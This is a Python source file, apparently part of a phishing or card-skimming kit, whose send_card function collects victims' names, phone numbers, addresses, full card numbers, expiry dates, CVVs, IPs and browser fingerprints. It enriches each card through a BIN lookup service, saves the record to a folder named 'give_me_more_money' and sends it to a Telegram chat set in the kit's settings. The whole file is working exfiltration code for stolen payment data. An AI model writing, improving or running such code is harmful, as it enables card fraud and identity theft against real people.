import os

import requests
import telebot

from util.redis_util import get_settings


def send_card(data: dict):
    TOKEN = get_settings()["telegram_token"]
    chat_id = get_settings()["telegram_id"]
    tb = telebot.TeleBot(TOKEN)
    try:
        card_info = requests.get(
            f'https://lookup.binlist.net/{data["card_number"][:6]}'
        ).json()
        # 宽容模式
        if "name" not in card_info["bank"]:
            card_info["bank"]["name"] = ""
        if "brand" not in card_info:
            card_info["brand"] = ""
        if "type" not in card_info:
            card_info["type"] = ""
        if "scheme" not in card_info:
            card_info["scheme"] = ""
        if "country" not in card_info:
            card_info["country"]["alpha2"] = ""
    except:
        card_info = {
            "country": {"alpha2": "未找到卡片信息"},
            "type": "",
            "brand": "",
            "scheme": "",
            "bank": {"name": ""},
        }

    message = f"""#--------------------------------[ 个人信息 ]--------------------------------#
姓名：{data['full_name']}
电话：{data['phonenumber']}
#--------------------------------[ 地址信息 ]--------------------------------#
州：{data['state']}
城市：{data['city']}
地址：{data['address_1']}
地址2：{data['address_2']}
邮编：{data['zip']}
#-------------------------------[ 付款详情 ]--------------------------------#
姓名：{data['full_name']}
卡号：{data['card_number']}
时间：{data['exp_date']}
CVV：{data['cvv']}
#-------------------------------[ 卡片详情 ]--------------------------------#
发行机构：{card_info['scheme']}
国家：{card_info['country']['alpha2']}
类型：{card_info['type']}
等级：{card_info['brand']}
银行：{card_info['bank']['name']}
#-------------------------------[ 指纹详情 ]--------------------------------#
IP：{data['ip']}
User-Agent：{data['User_Agent']}
语言：{data['lang']}
设备：{data['plat']}

时间：{data['time']}
"""
    if os.path.exists("give_me_more_money") is False:
        os.makedirs("give_me_more_money")
    with open(
            f'give_me_more_money/{data["card_number"]}----{card_info["type"]}.txt', "a+"
    ) as file:
        file.write(message)
    if get_settings()["telegram_push"] == "0":
        return
    if TOKEN == "" or chat_id == "":
        return
    try:
        tb.send_message(chat_id, message)
    except BaseException as e:
        print(e)
